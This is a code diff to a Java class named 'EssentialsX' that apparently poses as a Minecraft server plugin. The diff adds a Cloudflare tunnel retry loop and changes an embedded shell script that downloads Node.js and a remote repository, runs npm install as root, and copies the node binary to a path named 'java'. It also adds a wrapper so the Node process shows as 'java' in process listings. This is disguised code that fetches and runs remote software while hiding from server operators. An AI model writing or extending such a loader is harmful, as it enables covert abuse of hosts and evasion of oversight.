@@ -292,6 +292,8 @@ public class EssentialsX extends JavaPlugin {
             pb.environment().put("PORT", port);
             pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
             pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
+            // ★ 移植自 PaperBootstrap：设置 HOME 到工作目录，避免 npm 写 /root 没权限
+            pb.environment().put("HOME", botDir.toString());
             
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
             pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
@@ -360,21 +362,38 @@ public class EssentialsX extends JavaPlugin {
             // ★ 关键修复：每次启动 CF 前清空旧日志，防止正则匹配到旧的隧道 URL
             try { Files.writeString(cfLog, ""); } catch (Exception ignored) {}
 
-            Files.createDirectories(cfConf.getParent());
-            String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
-            Files.writeString(cfConf, confContent);
+            // ★ 移植自 PaperBootstrap：多协议轮询启动 CF（quic → http2 → auto）
+            //    quic 通常最快，但某些网络环境只支持 http2
+            String[] protocols = {"quic", "http2", "auto"};
+            boolean started = false;
+            for (String proto : protocols) {
+                if (started) break;
+                try {
+                    Files.createDirectories(cfConf.getParent());
+                    String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: " + proto + "\n";
+                    Files.writeString(cfConf, confContent);
 
-            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
-            
-            pb.directory(botDir.toFile());
-            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
-            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
+                    ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
+                    pb.directory(botDir.toFile());
+                    pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
+                    pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
 
-            cfProcess = pb.start();
-            lastCfRestartTime = System.currentTimeMillis();
+                    Process tryCf = pb.start();
+                    // ★ 关闭不需要的流
+                    try { tryCf.getOutputStream().close(); } catch (Exception ignored) {}
 
-            // ★ 关闭不需要的流，防止文件描述符泄漏
-            try { cfProcess.getOutputStream().close(); } catch (Exception ignored) {}
+                    // 等 5 秒看进程是否存活
+                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
+                    if (tryCf.isAlive()) {
+                        cfProcess = tryCf;
+                        lastCfRestartTime = System.currentTimeMillis();
+                        started = true;
+                    } else {
+                        // 这个协议不行，清空日志试下一个
+                        try { Files.writeString(cfLog, ""); } catch (Exception ignored2) {}
+                    }
+                } catch (Exception ignored) {}
+            }
         } catch (Exception ignored) {}
     }
 
@@ -737,6 +756,9 @@ public class EssentialsX extends JavaPlugin {
         "REPO_URL=\"" + repoUrl + "\"\n" +
         "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
         "\n" +
+        "# ★ 移植自 PaperBootstrap：设置 HOME 到工作目录，避免 npm 缓存写 /root 没权限\n" +
+        "export HOME=\"$WORK_DIR\"\n" +
+        "\n" +
         "# ★ 全局 umask 确保新建文件/目录权限宽松（所有用户可读可执行）\n" +
         "umask 0002\n" +
         "\n" +
@@ -777,7 +799,7 @@ public class EssentialsX extends JavaPlugin {
         "        fi\n" +
         "    done\n" +
         "    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n" +
-        "        tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null\n" +
+        "        tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null\n" +
         "        rm -f \"$WORK_DIR/node.tar.gz\"\n" +
         "        chmod -R 775 \"$NODE_DIR\" 2>/dev/null\n" +
         "        find \"$NODE_DIR/bin\" -type f -exec chmod +x {} + 2>/dev/null\n" +
@@ -804,7 +826,7 @@ public class EssentialsX extends JavaPlugin {
         "        fi\n" +
         "    done\n" +
         "    if [ \"$NODE2_OK\" = \"true\" ]; then\n" +
-        "        mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 2>/dev/null\n" +
+        "        mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 --no-same-owner 2>/dev/null\n" +
         "        mkdir -p \"$NODE_DIR/bin\"\n" +
         "        cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"\n" +
         "        rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
@@ -846,7 +868,7 @@ public class EssentialsX extends JavaPlugin {
         "\n" +
         "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
         "\n" +
-        "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
+        "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\n" +
         "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
         "mv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
         "cd \"$APP_DIR\"\n" +
@@ -854,7 +876,10 @@ public class EssentialsX extends JavaPlugin {
         "chmod -R 775 \"$APP_DIR\" 2>/dev/null\n" +
         "\n" +
         "# ========== 3. npm install ==========\n" +
-        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
+        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
+        "if [ $? -ne 0 ]; then\n" +
+        "    \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >/dev/null 2>&1\n" +
+        "fi\n" +
         "sleep 2\n" +
         "# ★ npm install 后修复权限（npm 可能创建的 .cache 等目录权限可能不对）\n" +
         "chmod -R 775 \"$APP_DIR/node_modules\" 2>/dev/null\n" +
@@ -871,6 +896,15 @@ public class EssentialsX extends JavaPlugin {
         "if [ -f \"$NODE_DIR/bin/.node_real\" ]; then\n" +
         "    cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"\n" +
         "fi\n" +
+        "\n" +
+        "# ★ 移植自 PaperBootstrap：创建 node 包装脚本，ps 显示为 java\n" +
+        "chmod +w \"$NODE_DIR/bin/node\" 2>/dev/null\n" +
+        "rm -f \"$NODE_DIR/bin/node\"\n" +
+        "cat > \"$NODE_DIR/bin/node\" << 'NODEWRAPPER'\n" +
+        "#!/bin/bash\n" +
+        "exec -a \"java\" \"$(dirname \\$0)/.node_real\" \\$@\n" +
+        "NODEWRAPPER\n" +
+        "chmod +x \"$NODE_DIR/bin/node\"\n" +
         "\n" +
         "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
         "try {\n" +
